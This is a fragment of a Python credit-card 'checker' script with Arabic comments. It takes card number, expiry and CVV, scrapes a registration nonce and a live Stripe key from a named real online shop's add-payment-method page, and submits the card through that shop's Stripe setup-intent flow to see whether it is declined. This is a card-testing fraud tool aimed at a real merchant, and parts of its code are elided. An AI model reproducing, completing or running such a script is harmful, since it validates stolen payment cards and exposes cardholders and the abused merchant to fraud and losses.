...
def Stripe1(ccx):
    """
    فحص بطاقة على joodblady.com (Stripe - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    ...
    link = "https://joodblady.com/my-account/add-payment-method/"
    ...
    reg = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
    if reg:
        reg = reg.group(1)
    else:
    ...
    # ===== 2. فتح صفحة إضافة البطاقة =====
    res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers)
    
    pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
    if pk_live:
        pk_live = pk_live.group(1)
    else:
        return 'Stripe key not found ⚠️'
    ...
    if 'id' in res4:
        ...
        return 'Payment method creation failed ⚠️'
    
    # ===== 4. تأكيد setup intent =====
    final_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    ...
    r5 = r.post(f'{link}/wp-admin/admin-ajax.php', data=data, headers=final_headers).text
    
    if 'Your card was declined.' in r5 or 'Your card could not be set up' in r5:
...
if __name__ == '__main__':
    Getat = 'Stripe Auth - https://joodblady.com/my-account/add-payment-method/'
